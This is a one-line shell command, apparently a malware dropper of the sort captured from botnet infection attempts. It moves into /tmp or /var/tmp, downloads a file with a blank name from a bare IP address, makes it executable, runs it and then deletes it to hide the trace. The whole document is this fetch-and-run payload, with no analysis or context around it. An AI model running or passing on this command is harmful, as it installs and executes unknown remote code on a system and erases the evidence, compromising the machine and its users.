cd /tmp || cd /var/tmp; wget http://163.172.20.236/' '; chmod +x ' '; ./' '; rm -rf ' '
